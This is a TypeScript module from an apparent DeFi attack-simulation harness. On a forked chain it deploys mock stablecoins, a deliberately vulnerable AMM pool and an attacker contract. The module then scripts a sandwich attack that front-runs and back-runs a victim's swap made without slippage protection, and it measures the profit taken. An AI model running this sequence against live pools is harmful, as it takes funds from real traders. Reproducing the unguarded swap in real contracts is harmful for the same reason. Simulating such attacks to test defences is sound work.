import { parseEther, formatEther, maxUint256, type Address } from "viem";
import type { AttackModule, ModuleResult } from "../types";
import type { ForkRunner } from "../fork";
import { loadArtifact } from "../artifacts";

type Wallet = ReturnType<ForkRunner["wallet"]>;

// deploy a contract and return its address
async function deploy(w: Wallet, sourceFile: string, name: string, args: unknown[]): Promise<Address> {
  const { abi, bytecode } = loadArtifact(sourceFile, name);
  const hash = await w.deployContract({ abi, bytecode, args } as never);
  const receipt = await w.waitForTransactionReceipt({ hash });
  if (!receipt.contractAddress) throw new Error(`deploy of ${name} produced no address`);
  return receipt.contractAddress;
}

async function send(w: Wallet, address: Address, sourceFile: string, name: string, fn: string, args: unknown[]) {
  const { abi } = loadArtifact(sourceFile, name);
  const hash = await w.writeContract({ address, abi, functionName: fn, args } as never);
  await w.waitForTransactionReceipt({ hash });
}

// stablecoin sample tokens (18 decimals, ~$1), so wei -> usd is formatEther
function toUsd(wei: bigint): number {
  return Math.round(Number(formatEther(wei)) * 100) / 100;
}

export const sandwichModule: AttackModule = {
  name: "sandwich",
  async run(fork: ForkRunner): Promise<ModuleResult> {
    const deployer = fork.wallet(0);
    const victim = fork.wallet(2);

    const usdc = await deploy(deployer, "MockERC20.sol", "MockERC20", ["USDC", "USDC"]);
    const dai = await deploy(deployer, "MockERC20.sol", "MockERC20", ["DAI", "DAI"]);
    const pool = await deploy(deployer, "VulnerableAMM.sol", "VulnerableAMM", [usdc, dai]);

    // seed a 1M / 1M pool
    await send(deployer, usdc, "MockERC20.sol", "MockERC20", "mint", [deployer.account.address, parseEther("2000000")]);
    await send(deployer, dai, "MockERC20.sol", "MockERC20", "mint", [deployer.account.address, parseEther("2000000")]);
    await send(deployer, usdc, "MockERC20.sol", "MockERC20", "approve", [pool, maxUint256]);
    await send(deployer, dai, "MockERC20.sol", "MockERC20", "approve", [pool, maxUint256]);
    await send(deployer, pool, "VulnerableAMM.sol", "VulnerableAMM", "addLiquidity", [
      parseEther("1000000"),
      parseEther("1000000")
    ]);

    // attacker contract, funded with capital
    const atk = await deploy(deployer, "SandwichAttack.sol", "SandwichAttack", [pool, usdc, dai]);
    const capital = parseEther("100000");
    await send(deployer, usdc, "MockERC20.sol", "MockERC20", "mint", [atk, capital]);

    const before = (await fork.publicClient.readContract({
      address: usdc,
      abi: loadArtifact("MockERC20.sol", "MockERC20").abi,
      functionName: "balanceOf",
      args: [atk]
    })) as bigint;

    // front-run
    await send(deployer, atk, "SandwichAttack.sol", "SandwichAttack", "frontRun", [parseEther("50000")]);

    // victim swaps 100k usdc -> dai with no slippage guard
    await send(victim, usdc, "MockERC20.sol", "MockERC20", "mint", [victim.account.address, parseEther("100000")]);
    await send(victim, usdc, "MockERC20.sol", "MockERC20", "approve", [pool, maxUint256]);
    await send(victim, pool, "VulnerableAMM.sol", "VulnerableAMM", "swap", [usdc, parseEther("100000"), victim.account.address]);

    // back-run
    await send(deployer, atk, "SandwichAttack.sol", "SandwichAttack", "backRun", []);

    const after = (await fork.publicClient.readContract({
      address: usdc,
      abi: loadArtifact("MockERC20.sol", "MockERC20").abi,
      functionName: "balanceOf",
      args: [atk]
    })) as bigint;

    const profit = after > before ? after - before : 0n;
    return {
      name: "sandwich",
      success: profit > 0n,
      extractedUsd: toUsd(profit),
      note: "sandwiched an unprotected victim swap on the target pool"
    };
  }
};
